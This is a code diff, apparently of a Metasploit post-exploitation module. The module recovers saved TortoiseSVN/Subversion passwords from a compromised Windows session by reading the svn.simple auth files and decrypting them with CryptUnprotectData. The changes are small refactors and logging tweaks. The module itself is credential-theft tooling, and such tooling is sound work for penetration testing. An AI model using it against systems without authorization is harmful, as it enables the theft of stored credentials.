@@ -1,14 +1,10 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
-require 'msf/core/post/windows/priv'
-require 'msf/core/post/windows/registry'
 require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
@@ -52,7 +48,6 @@ class Metasploit3 < Msf::Post
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
-      #print_status("#{ret.inspect}")
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = [mem].pack("Q")
@@ -107,8 +102,7 @@ class Metasploit3 < Msf::Post
   def get_config_files
     # Determine if TortoiseSVN is installed and parse config files
     savedpwds = 0
-    user_appdata = session.fs.file.expand_path("%APPDATA%")
-    path = user_appdata + '\\Subversion\\auth\\svn.simple\\'
+    path = session.fs.file.expand_path("%APPDATA%\\Subversion\\auth\\svn.simple\\")
     print_status("Checking for configuration files in: #{path}")
 
     begin
@@ -191,7 +185,7 @@ class Metasploit3 < Msf::Post
     :source_type => "exploit",
     :user => user_name,
     :pass => password)
-    print_debug "Should have reported..."
+    vprint_status("Should have reported...")
 
     # Set savedpwds to 1 on return
     return 1
